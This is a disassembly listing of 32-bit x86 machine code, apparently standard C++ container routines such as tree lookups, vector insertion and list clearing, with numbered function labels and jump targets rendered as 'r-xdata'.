mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea eax [ esi + 0x10 ]
push eax
push ebx
mov ecx edi
mov ebp esi
call sub_45db70
test al al
mov [ esp + 0x10 ] al
je r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov al [ esi + 0x89 ]
test al al
je r-xdata
sub_46bf70
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
mov edi ecx
mov ebp [ edi + 0x4 ]
mov esi [ ebp + 0x4 ]
mov al [ esi + 0x89 ]
test al al
mov [ esp + 0x10 ] 0x1
jne r-xdata
mov ecx [ esp + 0x10 ]
push ebx
push ebp
push ecx
lea edx [ esp + 0x28 ]
push edx
mov ecx edi
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea eax [ esi + 0x10 ]
push eax
push ebx
mov ecx edi
mov ebp esi
call sub_45dbf0
test al al
mov [ esp + 0x10 ] al
je r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov al [ esi + 0x89 ]
test al al
je r-xdata
sub_46bfe0
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x89 ] 0x0
push ebx
mov bl 0x1
push edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x8 ] bl
jne r-xdata
mov eax [ esp + 0x8 ]
push edi
push edx
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax + 0x4 ] bl
mov [ eax ] ecx
pop ebx
pop ecx
retn 0x8
push ebp
mov ebp [ edi + 0x20 ]
push esi
mov esi [ edi + 0x24 ]
mov eax [ eax + 0x8 ]
mov [ esp + 0x10 ] 0x0
jb r-xdata
cmp esi [ eax + 0x34 ]
mov edx eax
ja r-xdata
pop esi
pop ebp
mov eax [ eax ]
mov [ esp + 0x10 ] bl
jmp r-xdata
cmp ebp [ eax + 0x30 ]
jae r-xdata
cmp [ eax + 0x89 ] 0x0
je r-xdata
sub_46c050
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x89 ] 0x0
push ebx
mov bl 0x1
push edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x8 ] bl
jne r-xdata
mov eax [ esp + 0x8 ]
push edi
push edx
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax + 0x4 ] bl
mov [ eax ] ecx
pop ebx
pop ecx
retn 0x8
push ebp
mov ebp [ edi + 0x28 ]
push esi
mov esi [ edi + 0x2c ]
mov eax [ eax + 0x8 ]
mov [ esp + 0x10 ] 0x0
jb r-xdata
cmp esi [ eax + 0x3c ]
mov edx eax
ja r-xdata
pop esi
pop ebp
mov eax [ eax ]
mov [ esp + 0x10 ] bl
jmp r-xdata
cmp ebp [ eax + 0x38 ]
jae r-xdata
cmp [ eax + 0x89 ] 0x0
je r-xdata
sub_46c0c0
push ecx
push ebp
mov ebp ecx
mov eax [ ebp + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
mov al [ esi + 0x89 ]
test al al
mov [ esp + 0xc ] 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0xc ]
push eax
push edi
push ecx
lea edx [ esp + 0x24 ]
push edx
mov ecx ebp
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebp
pop ecx
retn 0x8
lea ecx [ ecx ]
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov edi esi
call sub_4b69c7
and al 0x1
mov [ esp + 0xc ] al
je r-xdata
mov al [ esi + 0x89 ]
test al al
je r-xdata
sub_46c130
sub esp 0x8
mov eax [ ecx + 0x4 ]
push ebp
push esi
mov esi [ eax + 0x4 ]
mov ebp eax
mov al [ esi + 0x89 ]
test al al
push edi
mov edi [ esp + 0x1c ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0xc ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
push edi
push ebp
push eax
lea edx [ esp + 0x28 ]
push edx
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebp
add esp 0x8
retn 0x8
push ebx
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
jmp r-xdata
cmp [ esi + 0x28 ] ebx
jb r-xdata
push ecx
push edx
call sub_430900
add esp 0x8
test eax eax
setl al
test al al
mov [ esp + 0x10 ] al
je r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x1c ]
and eax ebx
mov ebx [ esi + 0x2c ]
and ebx 0x10
cmp eax ebx
je r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov [ esp + 0x10 ] 0x0
mov esi [ esi ]
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov eax [ edi + 0x18 ]
mov ebx 0x10
cmp eax ebx
mov ebp esi
jb r-xdata
mov ecx [ esp + 0x14 ]
pop ebx
mov al [ esi + 0x89 ]
test al al
je r-xdata
sub_46c1f0
sub esp 0x10
mov eax [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
push ebx
mov bl [ edx + 0x89 ]
test bl bl
mov [ esp + 0x10 ] ecx
mov [ esp + 0x8 ] 0x1
jne r-xdata
mov edx [ esp + 0x1c ]
push edx
push eax
mov eax [ esp + 0x10 ]
push eax
lea edx [ esp + 0x28 ]
push edx
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
add esp 0x10
retn 0x8
mov eax [ esp + 0x1c ]
push ebp
push esi
mov esi [ eax + 0x14 ]
push edi
mov [ esp + 0x10 ] esi
jmp r-xdata
cmp [ edx + 0x28 ] 0x10
mov ebx [ edx + 0x24 ]
mov [ esp + 0x18 ] edx
jb r-xdata
lea edi [ edx + 0x14 ]
mov edi [ edx + 0x14 ]
jmp r-xdata
test ebp ebp
je r-xdata
mov ebp esi
cmp esi ebp
jae r-xdata
cmp ebp ebx
jae r-xdata
cmp ebp ebx
mov ecx ebp
jb r-xdata
xor eax eax
cmp ebp ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov edx [ edx + 0x8 ]
mov edx [ edx ]
jmp r-xdata
test eax eax
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
pop edi
pop esi
pop ebp
mov al [ edx + 0x89 ]
test al al
je r-xdata
test eax eax
mov esi [ esp + 0x10 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
xor eax eax
[ esi ] [ edi ]
je r-xdata
setl al
test al al
mov [ esp + 0x14 ] al
je r-xdata
sub_46c2d0
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi edx
mov dl [ eax + 0x89 ]
test dl dl
mov [ esp + 0x8 ] 0x1
jne r-xdata
mov eax [ esp + 0x8 ]
push ebp
push esi
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebp
pop ecx
retn 0x8
push edi
mov edi [ ebp + 0x48 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
cmp edi [ eax + 0x58 ]
setl dl
test dl dl
mov esi eax
mov [ esp + 0xc ] dl
je r-xdata
pop edi
mov dl [ eax + 0x89 ]
test dl dl
je r-xdata
sub_46c340
push ecx
push ebx
push ebp
mov ebx ecx
mov eax [ ebx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
mov ebp eax
mov al [ esi + 0x89 ]
test al al
push edi
mov edi [ esp + 0x1c ]
mov [ esp + 0x10 ] 0x1
jne r-xdata
mov edx [ esp + 0x10 ]
push edi
push ebp
push edx
lea eax [ esp + 0x28 ]
push eax
mov ecx ebx
call sub_46b200
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
mov eax [ edi + 0x1c ]
mov ecx [ esi + 0x2c ]
mov edx 0x10
and eax edx
and ecx edx
cmp eax ecx
mov ebp esi
je r-xdata
cmp [ esi + 0x28 ] edx
jb r-xdata
test eax eax
je r-xdata
lea ecx [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
jmp r-xdata
mov [ esp + 0x10 ] 0x0
mov esi [ esi ]
mov [ esp + 0x10 ] 0x1
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
cmp [ edi + 0x18 ] edx
jb r-xdata
mov al [ esi + 0x89 ]
test al al
je r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
push ecx
push eax
call sub_430ad0
add esp 0x8
test eax eax
setl al
test al al
mov [ esp + 0x10 ] al
je r-xdata
sub_46c400
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_46a2c0
mov eax esi
add esp 0x14
shl eax 0x7
add eax edi
pop edi
pop esi
retn 0xc
sub_46c430
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0d38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ eax ]
xor ebx ebx
push 0xffffffff
push ebx
add eax 0x4
mov [ ebp - 0x38 ] ecx
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
call sub_401dd0
mov ecx [ esi + 0x4 ]
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
cmp ecx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_465430
mov ebx 0x7ffffff
sub ebx edx
cmp ebx edi
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x5
cmp ecx edi
mov [ ebp - 0x18 ] eax
jae r-xdata
mov edx eax
shr edx 0x1
mov ebx 0x7ffffff
sub ebx edx
cmp ebx eax
jae r-xdata
add edx edi
cmp eax edx
jae r-xdata
push eax
push ecx
mov ecx esp
shl edi 0x5
mov edx edi
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov edi eax
mov ecx esp
sub edi edx
mov [ ecx ] edi
mov ecx esi
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x10 ] edx
call sub_46b530
push ecx
mov ecx [ ebp - 0x18 ]
mov [ esi + 0x8 ] eax
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] ecx
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] edi
mov eax esp
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push edx
mov [ eax ] ebx
call sub_465cf0
add esp 0x10
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
add ecx ebx
mov [ eax ] ecx
mov ecx edi
shl ecx 0x5
mov [ ebp + 0x10 ] ecx
add ecx ebx
push ecx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] ebx
call sub_46b530
mov eax [ esi + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x5
lea edx [ ebp - 0x38 ]
push edx
sub edi ecx
push edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_46be60
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x38 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add eax edx
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0x8 ] esp
call sub_465cb0
add esp 0xc
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
shl eax 0x5
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov edx [ ebp + 0x8 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] eax
call sub_465fd0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x38 ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_46a1f0
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x14
push edx
mov eax edi
shl eax 0x5
add ecx eax
mov eax [ esi + 0x8 ]
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_465fd0
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edx edi
cmp eax edx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
add ecx ebx
shl edi 0x5
add edi ebx
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
jmp r-xdata
mov edx [ esi + 0x8 ]
push edx
push ecx
mov ecx esi
call sub_468440
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
add edi eax
test ecx ecx
je r-xdata
add eax edi
sub_46c730
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_469e90
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46c7b0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_469ee0
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46c830
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_469f30
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46c8b0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_469f80
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46c930
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_469fd0
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46c9b0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_46a020
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46ca30
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_46a070
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46cab0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_46a0c0
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46cb30
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_46a110
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46cbb0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
push edi
nop
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_46a160
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov edi ecx
lea ecx [ esp + 0x14 ]
call sub_45f1b0
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_469a10
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jne r-xdata
pop edi
sub_46cc30
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0d5b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8c
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push eax
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x18 ] esi
call sub_462d70
mov edx [ esi + 0x4 ]
xor ecx ecx
cmp edx ecx
mov [ ebp - 0x4 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x7
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_460f30
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edx ecx
je r-xdata
mov edi [ ebp + 0xc ]
cmp edi ecx
je r-xdata
mov ebx 0x1ffffff
sub ebx ecx
cmp ebx edi
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x7
test edx edx
jne r-xdata
mov ecx esi
call sub_465430
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x7
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov edx eax
sub edx ebx
sar edx 0x7
cmp edx edi
mov [ ebp - 0x14 ] eax
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x1ffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edi
cmp eax ecx
jae r-xdata
push eax
push ecx
mov ecx esp
shl edi 0x7
mov edx edi
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov edi eax
mov ecx esp
sub edi edx
mov [ ecx ] edi
mov ecx esi
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x10 ] edx
call sub_46b560
push ecx
mov ecx [ ebp - 0x14 ]
mov [ esi + 0x8 ] eax
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] ecx
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] edi
mov eax esp
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push edx
mov [ eax ] ebx
call sub_46a1b0
add esp 0x10
lea eax [ ebp - 0x98 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
add ecx ebx
mov [ eax ] ecx
mov ecx edi
shl ecx 0x7
mov [ ebp + 0x10 ] ecx
add ecx ebx
push ecx
push ecx
mov ecx esp
mov [ ebp - 0x14 ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp - 0x14 ] esp
mov [ eax ] ebx
call sub_46b560
mov eax [ esi + 0x8 ]
mov edx eax
sub edx ebx
lea ecx [ ebp - 0x98 ]
push ecx
sar edx 0x7
sub edi edx
push edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_46c400
mov edi [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edi ecx
lea eax [ ebp - 0x98 ]
mov [ esi + 0x8 ] edi
push eax
mov esi edi
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] ebx
